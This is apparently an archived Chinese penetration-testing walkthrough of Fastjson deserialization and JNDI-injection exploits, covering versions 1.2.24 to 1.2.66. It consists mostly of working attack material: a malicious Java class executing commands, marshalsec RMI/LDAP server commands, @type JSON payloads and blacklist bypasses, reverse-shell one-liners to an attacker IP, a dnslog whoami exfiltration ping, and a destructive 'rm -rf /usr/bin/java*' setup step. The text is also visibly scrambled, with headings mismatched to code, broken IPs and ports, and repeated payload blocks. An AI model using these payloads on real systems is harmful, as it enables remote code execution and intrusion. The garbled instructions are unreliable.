---
version: "unknown"
source: "MrWQ/vulnerability-paper"
product: "Fastjson1.x JNDI"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2017-18349"
referenced_identifiers: "CVE-2018-3149"
identifier_role: "primary"
identifier_status: "unknown"
title: "FastJson 渗透测试"
prerequisites: "来源所述条件，未列明部分仍待核：1.2.24/41/42/45/47/62/66; lab8u102; AutoType variants described inconsistently; metadata version is {"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/V_gPNfryXHjWfluuJyPv7Q"
id: "vw-f7c7f59f1efee230fe15a7b4"
entity_id: "ve-f7c7f59f1efee230fe15a7b4"
schema_version: "1"
previous_version: "{"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：1.2.24/41/42/45/47/62/66; lab8u102; AutoType variants described inconsistently; metadata version is {

代码与实验材料：RMI/LDAP lab and class code; headings/commands shifted, broken IP lines/ports, repeated62/66 payload block

来源证据范围：Original WeChat, Fastjson and marshalsec repos; no precise patches

- **结论使用边界（1）**：Multiple misassigned sections: impact contains startup/class code,&lt;=42 exp MyBatis,&lt;=45 exp cache bypass,&lt;=47 exp XBean。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：Invalid detection criterion；依据：JSON response and not404 means vulnerable。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **操作与副作用边界（3）**：Destructive host setup and unverified binary source; should isolate lab rather than recommend system replacement；依据：rm -rf /usr/bin/java* with third-party HTTP JDK archive。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **代码与转录边界（4）**：Malformed version metadata,8u121/122 explanation and RMI/LDAP URL/port inconsistencies。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# FastJson 渗透测试

> 版本字段校订（2026-10-04）：误填的版本字段原值逐字保存到对应 `previous_*` 字段。当前值区分正文声称的影响范围、实验环境与尚未知的范围；后文对该元数据误填的旧说明只描述校订前状态，未据此升级来源结论。

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/V_gPNfryXHjWfluuJyPv7Q)

**1.FastJson 简介**
-----------------

fastjson.jar 包原始下载地址：  

```
https://github.com/alibaba/fastjson
```

fastjson 用于将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。fastjson.jar 是阿里开发的一款专门用于 Java 开发的包，可以方便的实现 json 对象与 JavaBean 对象的转换，实现 JavaBean 对象与 json 字符串的转换，实现 json 对象与 json 字符串的转换。除了这个 fastjson 以外，还有 Google 开发的 Gson 包，其他形式的如 net.sf.json 包，都可以实现 json 的转换。方法名称不同而已，最后的实现结果都是一样的。  

```
将json字符串转化为json对象
在net.sf.json中是这么做的
JSONObject obj = new JSONObject().fromObject(jsonStr);//将json字符串转换为json对象
在fastjson中是这么做的
JSONObject obj=JSON.parseObject(jsonStr);//将json字符串转换为json对象
```

### **1.1 JNDI**

JNDI 是 Java 命名与目录接口（Java Naming and Directory Interface），在 J2EE 规范中是重要的规范之一。JNDI 提供统一的客户端 API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用 JNDI 再局域网上定位一台打印机，也可以用 JNDI 来定位数据库服务或一个远程 Java 对象。JNDI 底层支持 RMI 远程对象，RMI 注册的服务可以通过 JNDI 接口来访问和调用。  

##### JNDi 是应用程序设计的 Api，JNDI 可以根据名字动态加载数据，支持的服务主要有以下几种：

```
DNS、LDAP、CORBA对象服务、RMI
```

### **1.2 利用 JNDI References 进行注入**

对于这个知识点，我们需要先了解 RMI 的作用。  

首先 RMI（Remote Method Invocation）是专为 Java 环境设计的远程方法调用机制，远程服务器实现具体的 Java 方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI 依赖的通信协议为 JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为 Java 定制，要求服务端与客户端都为 Java 编写。这个协议就像 HTTP 协议一样，规定了客户端和服务端通信要满足的规范。在 RMI 中对象是通过序列化方式进行编码传输的。RMI 服务端可以直接绑定远程调用的对象以外，还可通过 References 类来绑定一个外部的远程对象，当 RMI 绑定了 References 之后，首先会利用 Referenceable.getReference() 获取绑定对象的引用，并在目录中保存，当客户端使用 lookup 获取对应名字时，会返回 ReferenceWrapper 类的代理文件，然后会调用 getReference() 获取 Reference 类，最终通过 factory 类将 Reference 转换为具体的对象实例。  

**服务端**  

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class RMIServer {
 public static void main(String args[]) throws Exception {
 Registry registry = LocateRegistry.createRegistry(1099);
 // Reference需要传入三个参数(className,factory,factoryLocation)
 // 第一个参数随意填写即可，第二个参数填写我们http服务下的类名，第三个参数填写我们的远程地址
 Reference refObj = new Reference("Evil", "EvilObject", "http://127.0.0.1:8000/");
 // ReferenceWrapper包裹Reference类，使其能够通过RMI进行远程访问
 ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
 registry.bind("refObj", refObjWrapper);
 }
}
```

###### 从 ReferenceWrapper 源码可以看出，该类继承自 UnicastRemoteObject，实现对 Reference 的包裹，使其能够通过 RMI 进行远程访问

![](../../.resource/remote/36ed70fee9c2fe299b8bd2d384d1f326412e8ffac3df0afe2f7411634ea113d1.png)

##### **客户端**

```
1.首先开启HTTP服务器，并将我们的恶意类放在目录下
2.开启恶意RMI服务器
3.攻击者控制url参数为上一步开启的恶意RMI服务器地址
4.恶意RMI服务器返回ReferenceWrapper类
5.目标（JNDI_Client）在执行lookup操作的时候，在decodeObject中将ReferenceWrapper变成Reference类，然后远程加载并实例化我们的Factory类（即远程加载我们HTTP服务器上的恶意类），在实例化时触发静态代码片段中的恶意代码
```

##### 如果我们可以控制 JNDI 客户端中传入的 url，就可以起一个恶意的 RMI，让 JNDI 来加载我们的恶意类从而进行命令执行。

##### 我们来看一下 References，References 类有两个属性，className 和 codebase url，className 就是远程引用的类名，codebase 决定了我们远程类的位置，当本地 classpath 中没有找到对应的类的时候，就会去请求 codebase 地址下的类（codebase 支持 http 协议），此时如果我们将 codebase 地址下的类换成我们的恶意类，就能让客户端执行。

##### ps：在 java 版本大于 1.8u191 之后版本存在 trustCodebaseURL 的限制，只能信任已有的 codebase 地址，不再能够从指定 codebase 中下载字节码。

##### 整个利用流程如下

```
1.反序列化常用的两种利用方式，一种是基于rmi，一种是基于ldap。
2.RMI是一种行为，指的是Java远程方法调用。
3.JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。
4.ldap指轻量级目录服务协议。
```

**2.FastJson 渗透总结**
-------------------

```
基于rmi的利用方式：适用jdk版本：JDK 6u132，JDK 7u131，JDK 8u121之前；
在jdk8u122的时候，加了反序列化白名单的机制，关闭了rmi远程加载代码。
基于ldap的利用方式，适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。
在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。
可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。
```

##### 存在 Java 版本限制：

```
Fastjson < 1.2.25
```

### **2.1 fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）**

**漏洞原理**  

FastJson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。  

通俗理解就是：漏洞利用 fastjson autotype 在处理 json 对象的时候，未对 @type 字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 rmi 主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。  

#### 影响版本

```
docker-compose up -d
docker ps
```

#### 漏洞启动

靶机：Ubuntu ip：192.168.9.234        攻击机：kali ip：192.168.10.65  

开启 fastjson 漏洞  

```
curl http://192.168.9.234:8090/ -H "Content-Type: application/json" --data '
{"name":"zcc", "age":18}'
```

![](../../.resource/remote/e14f4e9b18c4b4ccd43276f4063568f2f5f896a2c2b2876ef15622c2cfea4ad6.png)

![](../../.resource/remote/2e7d89ab0022a7a06f82fa53fa7bb65c0b157ad3b94e774a8eb6a947c986a319.png)

访问靶机，可以看见 json 格式的输出：  

![](../../.resource/remote/bb22f6d5c83853f9ac748fb48119835d8405801f5efad50060dedb38412cb8f4.png)

![](../../.resource/remote/93c05625ce8f66076a2f619b7b9b68e240952e196badfa99ffddf03c3ceb3d78.png)

因为是 Java 8u102，没有 com.sun.jndi.rmi.object.trustURLCodebase 的限制，我们可以使用 com.sun.rowset.JdbcRowSetImpl 的利用链，借助 JNDI 注入来执行命令。  

##### 在 kali 上执行下面这条命令，使用 curl 命令模拟 json 格式的 POST 请求，返回 json 格式的请求结果，没报 404，正常情况下说明存在该漏洞。

```
cd /opt
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
tar zxvf jdk-8u20-linux-x64.tar.gz
rm -rf /usr/bin/java*
ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
javac -version
java -version
```

![](../../.resource/remote/524837702576ae320c836e4a18bfbd05ca9bd6b2a006caa034f8432cc245145e.png)

##### kali 安装 Javac 环境，这里我已经安装好了

```
import java.lang.Runtime;
import java.lang.Process;
public class zcc{
 static {
 try {
 Runtime rt = Runtime.getRuntime();
 String[] commands = {"touch", "/tmp/zcctest"};
 Process pc = rt.exec(commands);
 pc.waitFor();
 } catch (Exception e) {
 // do nothing
 }
 }
}
```

![](../../.resource/remote/1a5fb43da399b12d5b52af62abd6f68eddac6e07612ea6025c65aad7f8ce568d.png)

##### 编译恶意类代码

```
javac zcc.java
```

![](../../.resource/remote/933e5635a7da79144bf742518d9e333df753ff4487bcf53df1b1683b8c265ce6.png)

![](../../.resource/remote/693aa9e49ed8be8e4aacb99f8fbf5c7991f33b8d75859b6d519cc0dcae0d03e4.png)

```
python -m SimpleHTTPServer 80
```

![](../../.resource/remote/b87e673589d47e21788bb4a5cd32d83fe212ba0835ae6117e8af6d5bf8a188a3.png)

搭建 http 服务传输恶意文件  

```
git clone https://github.com/mbechler/marshalsec.git
```

![](../../.resource/remote/742dd6eeedda66e1ff58d38dabfda2d66ca08832e157763cea635c1183e84cdb.png)

##### 编译并开启 RMI 服务:

>1 下载 marshalsec(我这里已经安装好）：  

```
apt-get install maven
```

![](../../.resource/remote/a76aa8419a23fedc0d2857a3621e90cd27b2656d4dc803f3a3d3646c807c392f.png)

>2 然后安装 maven：  

```
mvn clean package -DskipTests
```

![](../../.resource/remote/57bbdbfd5752ae8edf8c359b999a4fadcc817e7864e23bb6ca04ec722c52976c.png)

###### >3 然后使用 maven 编译 marshalsec 成 jar 包，我们先进入下载的 marshalsec 文件中运行：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.
10.65/#zcc" 9999
```

![](../../.resource/remote/72b02590a376614bc3af6102fa1e521fd8f887540001fdc7972c0a7e365549c9.png)

![](../../.resource/remote/5405065fb3468c00ae4822b64dbb0e42c4261ec59cba7748306b1bfda43efdce.png)

###### >4 然后我们借助 marshalsec 项目，启动一个 RMI 服务器，监听 9999 端口，并制定远程加载类 TouchFile.class，这里的 ip 为你上面开启 http 服务的 ip，我们这里就是 kali 的 ip:

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168
.10.65/#zcc" 9999
```

这里如果要启动 LDAP 服务的话，只需把上面命令中的 RMI 改成 LDAP 即可，例如：  

```
{
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.10.65:9999/zcc",
 "autoCommit":true
 }
}
```

![](../../.resource/remote/f26f8bdd7c5e89ee30b1339a472751d7608ee2c3fd31ffd531b22bede5b0c041.png)

可以看见请求成功，并加载了恶意类。  

>5 使用 BP 抓包，并写入 poc(记住请求包里面请求方式改成 post，Content-Type 改成 application/json)：

```
http://www.dnslog.cn/
```

![](../../.resource/remote/5558692451c5215e6ad35bac9776ea5096e0fa4691051fb1891f33dfe9cde73c.png)

![](../../.resource/remote/a5bfddee487d96d2185468392980d04755bdaaefa43df21bef9a5b77ca5edbb4.png)

![](../../.resource/remote/9af921aef9e864f13aaf1193ced624412f138ed736e5e691177a02b92e957cc5.png)

![](../../.resource/remote/c68350b4d61a5b8477965b29e7ca11e252c7c7347449e7406e7b23bf6199d019.png)

![](../../.resource/remote/22e1daf8cc0101cb460d511525d87aa00ee1525aae41ffb260e228131ef6c62f.png)

可以看见成功写入。  

这里我们用 dnslog 做一个小测试：

```
"/bin/sh","-c","ping user.'whoami'.jeejay.dnslog.cn"
```

![](../../.resource/remote/914e1ecb78fd698768737943987ffc235b0a5630a929c4934be82f37bbd2b2d8.png)

直接覆盖原来得文件；  

```
"/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.65/8899;cat <&5 | while read line; do $line 2>&5 >&5; done"
或者
"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.10.65/1234 0>&1"
```

![](../../.resource/remote/371f13e00e7f07a2fa8bc2e37a326c6e106b527280e68f6015938cb1d62bc174.png)

![](../../.resource/remote/24c5224b0007ae3e3bb78a5831d1cf736ad6abe57ed1003f0223c23504b6a65a.png)

点击 send 发送之后成功回显  

![](../../.resource/remote/02b1d977efbb4c81f372558995b260f37f2cf17f33d2d4f7c184563c6c72e6b8.png)

##### 反弹 shell 的话也只需修改恶意类中 commands 的内容即可，代码参考如下，建议用第二个，第二个前面带主机名，看起来舒服点，我这里用的第一个；

```
Fastjson < 1.2.47
```

![](../../.resource/remote/d49fd70f20110627c9d979dd9c2c42ec5c005c8e2365f4f8ef6c64135e726488.png)

![](../../.resource/remote/5adb859698c8e12a15bea0b46489725a756feab55c5090798d7e25a07830df10.png)

### **2.2 Fastjson 1.2.47 远程命令执行漏洞**

**漏洞原理**  

Fastjson 是阿里巴巴公司开源的一款 json 解析器，其性能优越，被广泛应用于各大厂商的 Java 项目中。fastjson 于 1.2.24 版本后增加了反序列化白名单，而在 1.2.48 以前的版本中，攻击者可以利用特殊构造的 json 字符串绕过白名单检测，成功执行任意命令。  

#### 影响版本

```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;
public class zcc {
 static {
 try {
 Runtime rt = Runtime.getRuntime();
 String[] commands = {"touch", "/tmp/zcctest111"};
 Process pc = rt.exec(commands);
 pc.waitFor();
 } catch (Exception e) {
 // do nothing
 }
 }
}
```

漏洞启动

![](../../.resource/remote/f0118a8de4fac3033b2ea2b03b2e13d4a78690c9249bdc4188339344996f650b.png)

![](../../.resource/remote/f5e972a6670ed2c0490497b250e732220ba0380d9d4b88eb8bf1151a29bb58fd.png)

##### 因为目标环境是 openjdk：8u102，

##### 这个版本没有 com.sun.jndi.rmi.object.trustURLCodebase 的限制，我们可以利用 RMI 进行命令执行。

![](../../.resource/remote/82eafbbf80bf2c3fd522955493365a360449ff7e56a01bc843ecdceb5f806002.png)

```
python -m SimpleHTTPServer 8080
```

![](../../.resource/remote/a96e05a5bdac6169758ac1922e57582a5df2e7744104090adfa1239cd8b16a8c.png)

![](../../.resource/remote/b8b55385f1474a545466accf5694647d9d77c477cea8536bc9d37b048a4ea9b2.png)

开启 http 服务  

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.10.65/#zcc" 9999
```

![](../../.resource/remote/e26b5f9f89b6d297491f975db26061fd17af8b96c58997ae0045d8d3c67b1632.png)

![](../../.resource/remote/71a57348f41714c2fe5703d42458fd2c22dc55062da77944bdd50a9290ffda7f.png)

借助 marshalsec 项目启动 RMI 服务器，监听 9998 端口，并制定加载远程类 zcc.class:  

```
{
 "a":{
 "@type":"java.lang.Class",
 "val":"com.sun.rowset.JdbcRowSetImpl"
 },
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.10.65:9999/zcc",
 "autoCommit":true
 }
}
```

![](../../.resource/remote/6d587340aac5925400391c5dabb006a3a3c33d1423419c7793f51ea246d4bfa5.png)

发送 payload, 别忘了改 Content-Type: application/json，可以看见成功写入，反弹 shell 的手段和上面 1.2.24 的一样：

```
"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.10.65/8899 0>&1"
```

![](../../.resource/remote/a644c486a87b27e06cd09e26877fec0d1e68eb858a2b9390751b21ad395285a7.png)

![](../../.resource/remote/5133f13f92c96d2f13c63a3f043ad8712411623148c45bc50a939d2c500fb57c.png)

![](../../.resource/remote/2f72b89befcb17f4c07b135b31b387c1fa4d88aa55769d40a435e676a266083b.png)

反弹 shell；  

```
{           
  "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
  "dataSourceName":"rmi://x.x.x.x:9999/rce_1_2_24_exploit",
  "autoCommit":true
}
```

![](../../.resource/remote/3c4b7943db23e6c5c0b278630f8a20ecd9f23f318977bac20a3dd9a75831bbd4.png)

![](../../.resource/remote/f3a5394ad51336e5fbd64853ed2a1c0f2423f412aa7b02200554f60c423cbf2a.png)

### **2.3 fastjson<=1.2.41 漏洞详情**

第一个 Fastjson 反序列化漏洞爆出后，阿里在 1.2.25 版本设置了 autoTypeSupport 属性默认为 false，并且增加了 checkAutoType() 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的的。com.sun.rowset.jdbcRowSetlmpl 在 1.2.25 版本被加入了黑名单，fastjson 有个判断条件判断类名是否以 "L" 开头、以 ";" 结尾，是的话就提取出其中的类名在加载进来，因此在原类名头部加 L，尾部加; 即可绕过黑名单的同时加载类。  

##### exp：

```
原类名：com.sun.rowset.JdbcRowSetImpl
绕过：LLcom.sun.rowset.JdbcRowSetImpl;;
```

autoTypeSupport 属性为 true 才能使用。（fastjson>=1.2.25 默认为 false  

**2.4 fastjson<=1.2.42 漏洞详情**  

##### fastjson 在 1.2.42 版本新增了校验机制。如果输入类名的开头和结尾是 L 和; 就将头尾去掉再进行黑名单校验。绕过方法：在类名外部嵌套两层 L 和;。

```
{           
  "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
  "dataSourceName":"rmi://x.x.x.x:9999/exp",
  "autoCommit":true
}
```

##### exp：

```
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}
```

##### autoTypeSupport 属性为 true 才能使用。（fastjson>=1.2.25 默认为 false）

**2.5 fastjson<=1.2.45 漏洞详情**  

前提条件：目标服务器存在 mybatis 的 jar 包，且版本需为 3.x.x 系列 < 3.5.0 的版本。  

使用黑名单绕过，org.apache.ibatis.datasource 在 1.2.46 版本被加入了黑名单。  

autoTypeSupport 属性为 true 才能使用。（fastjson>=1.2.25 默认为 false）  

exp：

```
{
 "a": {
 "@type": "java.lang.Class", 
 "val": "com.sun.rowset.JdbcRowSetImpl"
 }, 
 "b": {
 "@type": "com.sun.rowset.JdbcRowSetImpl", 
 "dataSourceName": "rmi://x.x.x.x:9999/exp", 
 "autoCommit": true
 }
}
```

### **2.6 fastjson<=1.2.47 漏洞详情**

对版本小于 1.2.48 的版本通杀，autoType 为关闭状态也可用。loadClass 中默认 cache 为 true，利用分 2 步，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.jdbcRowSetlmpl 这个类，绕过了黑名单机制。  

##### exp：

```
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://x.x.x.x:999
9/exploit"}";
```

### **2.7 fastjson<=1.2.62 漏洞详情**

基于黑名单绕过 exp：  

```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransacti
on":"ldap://192.168.80.1:1389/Calc"\}\}
```

### **2.8 fastjson<=1.2.66 漏洞详情**

也是基于黑名单绕过，autoTypeSupport 属性为 true 才能使用，（fastjson>=1.2.25 默认为 false）以下是几个 exp：  

```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransacti
on":"ldap://192.168.80.1:1389/Calc"\}\}
```

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
